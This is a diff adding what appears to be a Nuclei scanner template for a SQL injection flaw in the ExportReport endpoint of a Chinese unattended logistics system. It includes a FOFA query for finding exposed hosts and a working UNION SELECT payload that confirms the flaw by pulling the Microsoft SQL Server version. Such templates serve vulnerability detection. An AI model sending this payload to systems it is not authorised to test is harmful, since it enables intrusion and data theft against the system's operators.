@@ -1,0 +1,37 @@
+id: yisi-ExportReport-sql
+
+info:
+  name: 易思智能物流无人值守系统 ExportReport 接口 SQL注入漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/api/ExportReport"
+      易思智能物流无人值守系统的 ExportReport 接口存在 SQL 注入漏洞。攻击者可通过构造恶意 SQL 语句绕过身份验证机制，直接访问数据库内容（如管理员凭证、用户隐私数据等敏感信息）。在具备高权限的情况下，攻击者可能进一步在目标服务器写入后门文件，实现远程代码执行并完全控制服务器。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247489282&idx=1&sn=db4d0926ef072190c0b575b85b7f53a2&chksm=c267a231f5102b27572f11a7629019e53cc4ca5c1fddf6d1a116936878f032bc061e7866e0a4&token=1884652675&lang=zh_CN#rd
+  tags: 易思智能物流无人值守系统
+
+
+http:
+- raw:
+  - |
+    POST /Sys_ReportFile/ExportReport HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+    Content-Type: application/x-www-form-urlencoded
+
+    rep_Ids=1%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2C@@VERSION%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+CdNX
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'Microsoft SQL'
+    - 'Microsoft Corporation'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
